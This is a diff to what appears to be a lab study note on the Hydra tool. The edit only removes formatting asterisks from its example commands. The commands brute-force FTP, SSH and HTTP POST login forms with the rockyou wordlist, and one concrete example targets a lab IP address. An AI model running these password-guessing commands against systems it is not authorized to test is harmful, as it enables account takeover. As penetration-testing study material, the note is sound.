@@ -23,17 +23,17 @@ These are the essential flags needed to be known to use hydra
 ## Example Hydra Syntax:
 ### To brute-force FTP with the username being user and using a password list such as rockyou.txt
 ```bash
-**hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP** 
+hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP 
 ```
 
 ### To brute-force SSH password
 ```bash
-**hydra -l <username> -P <path_to_password_list> MACHINE_IP -t 4 ssh
+hydra -l <username> -P <path_to_password_list> MACHINE_IP -t 4 ssh
 ```
 
 ### To brute-force a POST login form
 ```bash
-**sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>"**
+sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>"
 ```
 
 More concrete example: 
@@ -43,7 +43,7 @@ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.163.211 http-post-
 
 ### To use -s and -V flag
 ```bash
-**hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>" -s <port> -V**
+hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path_to_login_page>:<login_credentials>:<invalid_response>" -s <port> -V
 ```
 
 ## Key Notes
